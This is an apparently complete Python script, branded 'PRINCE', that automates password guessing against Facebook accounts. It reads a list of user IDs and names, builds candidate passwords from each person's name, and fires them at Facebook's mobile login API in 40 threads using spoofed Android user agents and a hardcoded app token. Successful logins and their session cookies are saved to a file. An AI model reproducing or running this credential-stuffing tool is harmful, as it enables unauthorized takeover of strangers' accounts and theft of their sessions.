import os
import random
import string
import sys
import threading
import time
import uuid
import rich
import charset_normalizer
from datetime import datetime
from rich import print
import requests
import certifi
from concurrent.futures import ThreadPoolExecutor as ThreadPool
version = "  v1"

ua = []


def live_update():
    try:
        url = "https://raw.githubusercontent.com/TEAM-ELITE1/database/main/XYA.txt"
        response = requests.get(url, verify=certifi.where())
        datax = response.text.splitlines()[0]
        for u in datax.split("|"):
            ua.append(u)
    except Exception as e:
        print("[!!] Internet Error:", e)
        sys.exit()


def Samsung():
    Anderson = random.choice(["10", "13", "7.0.0", "7.1.1", "9", "12", "11", "9.0", "8.0.0", "7.1.2", "7.0", "4", "5",
                              "4.4.2", "5.1.1", "6.0.1", "9.0.1"])
    model = random.choice(["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F",
                           "SM-A326B", "SM-A125F", "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN",
                           "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F", "SM-N9005", "SM-J210F"])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice(["com.facebook.adsmanager|MobileAdsManagerAndroid", "com.facebook.katana|FB4A",
                        "com.facebook.orca|Orca-Android", "com.facebook.mlite|MessengerLite"])
    FBAN = fb.split("|")[1]
    platform = fb.split("|")[0]
    ua = f"Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) [FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.choice(range(1, 4))}.0,width={random.choice(range(720, 1500))},height={random.choice(range(1500, 2000))};FB_FW/1;]"
    return ua


def dd(fbbd, device):
    if fbbd.lower() == "samsung":
        return random.choice(["GT-I9505", "SM-T835", "SM-S901U", "MMB29K", "SM-S134DL", "SM-J250F", "SM-A217F",
                              "SM-A326B", "SM-A125F", "SM-A720F", "SM-A326U", "SM-G532M", "SM-J410G", "SM-A205GN",
                              "SM-A205GN", "SM-A505GN", "SM-G930F", "SM-J210F", "SM-N9005", "SM-J210F"])
    elif fbbd.lower() == "vivo":
        return random.choice(["vivo 1935", "V3Max"])
    elif fbbd.lower() == "motorola":
        return random.choice(['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5',
                              'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3',
                              'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus',
                              'Moto G6', 'Moto X', 'moto g power (2021)'])
    # Add other brands if needed
    else:
        return device


class Sort:
    @staticmethod
    def line():
        return "[b dark_sea_green2]━" * 37

    @staticmethod
    def clear():
        os.system("clear")

    @staticmethod
    def logo():
        aci = f'''    //   ) )                                      
   //___/ /  __     ( )   __      ___      ___    
  / ____ / //  ) ) / / //   ) ) //   ) ) //___) ) 
 //       //      / / //   / / //       //        
//       //      / / //   / / ((____   ((____{version}\n{Sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]PRINCE\n     [red1]✗ [light_green]Status    [orange3]▶  [medium_purple1][r]Free[/r]\n{Sort.line()}'''
        print(aci)

    @staticmethod
    def color():
        co = ['\x1b[1;93m', '\x1b[1;91m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m']
        cx = random.choice(co)
        return cx


oks = []
loop = 0


def file_sub(uid, pwx, name, meth, fl):
    global oks, loop
    try:
        if meth in ["a", "A", "1"]:
            uax = ua[0]
        elif meth in ["b", "B", "2"]:
            uax = ua[1]
        elif meth in ["c", "C", "3"]:
            uax = ua[2]
        elif meth in ["d", "D", "4"]:
            uax = ua[3]
        elif meth in ["e", "E", "5"]:
            uax = ua[4]
        elif meth in ["f", "F", "6"]:
            uax = ua[5]
        elif meth in ["g", "G", "7"]:
            uax = ua[6]
        else:
            uax = ua[7]

        sys.stdout.write(
            f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(fl))}  • {str(len(oks))}"),
        sys.stdout.flush()
        First = name.split(" ")[0]
        try:
            Last = name.split(" ")[1]
        except:
            Last = "khan"
        for pw in pwx:
            ps = pw.replace("first", First.lower()).replace("First", First).replace("last", Last.lower()).replace(
                "Last", Last).replace("Name", name).replace("name", name.lower()).replace("FIRST",
                                                                                          First.upper()).replace(
                "LAST", Last.upper())

            token = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
            adi = str(uuid.uuid4())
            data = {
                "adid": adi,
                "format": "json",
                "device_id": adi,
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": ps,
                "access_token": token,
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_GB",
                "client_country_code": "GB",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
                'User-Agent': uax,
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Connection': 'close',
                'cache-control': 'no-cache',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'X-fb-device-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url = 'https://graph.facebook.com/auth/login'
            rq = requests.post(url, data=data, headers=head, allow_redirects=False, verify=certifi.where()).json()
            if "session_key" in rq:
                coki = ";".join(i["name"] + "=" + i["value"] for i in rq["session_cookies"])
                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}|{coki}\n")
                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + coki + "\n")
                oks.append(uid)

                break
            elif "Please Confirm Email" in str(rq):
                print(f"\r\r[b r green_yellow][PRINCE-OK][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
                open("/sdcard/PRINCEFILE-OK.txt", "a").write(uid + "|" + ps + "|" + "\n")
                oks.append(uid)

                break
            else:
                continue
    except Exception as e:
        print("Error in file_sub:", e)
    finally:
        loop += 1


def filee():
    global oks, loop
    pwx = []
    Sort.clear()
    Sort.logo()
    print("[b]    [red1][B] [spring_green1]BD/IND FILE Clone")
    print(Sort.line())
    print("[b] Π[chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] "
          "/sdcard/id.txt")
    path = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(Sort.line())
    try:
        with open(path, "r") as file:
            fl = file.read().splitlines()
    except Exception as e:
        print("Error:", e)
        filee()
    limit = int(input("   Password Limit -> "))
    print(Sort.line())
    for i in range(limit):
        print(
            " [b] Π[chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
        passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
        if passw not in pwx:
            pwx.append(passw)
        print(Sort.line())
    print("  [r dark_olive_green1]Π1[/r dark_olive_green1][b violet] Method 1")
    print("  [r dark_olive_green1]Π2[/r dark_olive_green1][b violet] Method 2")
    print("  [r dark_olive_green1]Π3[/r dark_olive_green1][b violet] Method 3")
    print("  [r dark_olive_green1]Π4[/r dark_olive_green1][b violet] Method 4")
    print("  [r dark_olive_green1]Π5[/r dark_olive_green1][b violet] Method 5")
    print("  [r dark_olive_green1]Π6[/r dark_olive_green1][b violet] Method 6")
    print("  [r dark_olive_green1]Π7[/r dark_olive_green1][b violet] Method 7")
    print("  [r dark_olive_green1]Π8[/r dark_olive_green1][b violet] Method 8")
    print(Sort.line())
    meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(Sort.line())
    with ThreadPool(max_workers=40) as sub:
        print(Sort.logo())
        print("[b bright_white]  Π! [r violet]USERNAME[/r violet] [light_sky_blue1]   ▶  [/light_sky_blue1] " + ussr[0])
        print(Sort.line())
        print(
            f"  [r dark_olive_green1]Π![/r dark_olive_green1][chartreuse1] Today Date  [b deep_pink2]⟨[/b deep_pink2]   {today} ")
        print(
            f"  [r dark_sea_green1]Π![/r dark_sea_green1] [light_green]Total Pas[b red1]  ⟩ [/b red1]  [light_green] +{str(len(pwx))}")
        print(Sort.line())
        try:
            for xd in fl:
                uid, name = xd.split("|")
                sub.submit(file_sub, uid, pwx, name, meth, fl)

        except:
            pass
    print("\r\r" + Sort.line())
    print(f"  Π! Total OK id : {str(len(oks))}")
    print(f"  Π! Save  /sdcard/pot.txt ")
    print(Sort.line())
    sys.exit()


def free():
    live_update()
    Sort.clear()
    Sort.logo()
    filee()


if __name__ == "__main__":
    free()
